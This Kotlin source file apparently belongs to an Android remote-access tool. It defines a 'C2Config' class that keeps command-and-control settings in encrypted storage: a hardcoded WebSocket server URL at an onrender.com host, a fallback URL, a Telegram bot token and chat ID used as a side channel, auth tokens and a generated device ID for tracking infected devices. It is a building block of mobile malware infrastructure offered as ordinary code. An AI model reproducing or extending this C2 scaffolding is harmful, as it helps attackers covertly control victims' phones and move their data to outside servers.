package com.xrc.app.c2

import android.content.Context
import android.content.SharedPreferences
import androidx.security.crypto.EncryptedSharedPreferences
import androidx.security.crypto.MasterKey

/**
 * C2 configuration with encrypted storage.
 * Stores connection URLs, credentials, and device identity.
 */
class C2Config(context: Context) {

    private val masterKey = MasterKey.Builder(context)
        .setKeyScheme(MasterKey.KeyScheme.AES256_GCM)
        .build()

    private val prefs: SharedPreferences = EncryptedSharedPreferences.create(
        context,
        "xrc_c2_config",
        masterKey,
        EncryptedSharedPreferences.PrefKeyEncryptionScheme.AES256_SIV,
        EncryptedSharedPreferences.PrefValueEncryptionScheme.AES256_GCM
    )

    var primaryUrl: String
        get() = prefs.getString(KEY_PRIMARY_URL, DEFAULT_PRIMARY_URL) ?: DEFAULT_PRIMARY_URL
        set(value) = prefs.edit().putString(KEY_PRIMARY_URL, value).apply()

    var fallbackUrl: String
        get() = prefs.getString(KEY_FALLBACK_URL, DEFAULT_FALLBACK_URL) ?: DEFAULT_FALLBACK_URL
        set(value) = prefs.edit().putString(KEY_FALLBACK_URL, value).apply()

    var telegramBotToken: String
        get() = prefs.getString(KEY_TELEGRAM_BOT, "") ?: ""
        set(value) = prefs.edit().putString(KEY_TELEGRAM_BOT, value).apply()

    var telegramChatId: String
        get() = prefs.getString(KEY_TELEGRAM_CHAT, "") ?: ""
        set(value) = prefs.edit().putString(KEY_TELEGRAM_CHAT, value).apply()

    var deviceId: String
        get() = prefs.getString(KEY_DEVICE_ID, generateDeviceId()) ?: generateDeviceId()
        set(value) = prefs.edit().putString(KEY_DEVICE_ID, value).apply()

    var authToken: String
        get() = prefs.getString(KEY_AUTH_TOKEN, "") ?: ""
        set(value) = prefs.edit().putString(KEY_AUTH_TOKEN, value).apply()

    var isConnected: Boolean
        get() = prefs.getBoolean(KEY_CONNECTED, false)
        set(value) = prefs.edit().putBoolean(KEY_CONNECTED, value).apply()

    var lastOnlineTimestamp: Long
        get() = prefs.getLong(KEY_LAST_ONLINE, 0L)
        set(value) = prefs.edit().putLong(KEY_LAST_ONLINE, value).apply()

    val connectionUrls: List<String>
        get() = listOf(primaryUrl, fallbackUrl).filter { it.isNotBlank() }

    private fun generateDeviceId(): String {
        return "XRC-${System.currentTimeMillis().toString(16).padStart(8, '0')}-${(1000..9999).random()}"
    }

    fun getTelegramUrl(): String {
        return "https://api.telegram.org/bot$telegramBotToken"
    }

    fun saveUrls(primary: String, fallback: String) {
        primaryUrl = primary
        fallbackUrl = fallback
    }

    companion object {
        private const val KEY_PRIMARY_URL = "primary_url"
        private const val KEY_FALLBACK_URL = "fallback_url"
        private const val KEY_TELEGRAM_BOT = "telegram_bot"
        private const val KEY_TELEGRAM_CHAT = "telegram_chat"
        private const val KEY_DEVICE_ID = "device_id"
        private const val KEY_AUTH_TOKEN = "auth_token"
        private const val KEY_CONNECTED = "connected"
        private const val KEY_LAST_ONLINE = "last_online"

        private const val DEFAULT_PRIMARY_URL = "wss://xrc-c2.onrender.com/ws"
        private const val DEFAULT_FALLBACK_URL = "ws://127.0.0.1:8080/ws"
    }
}
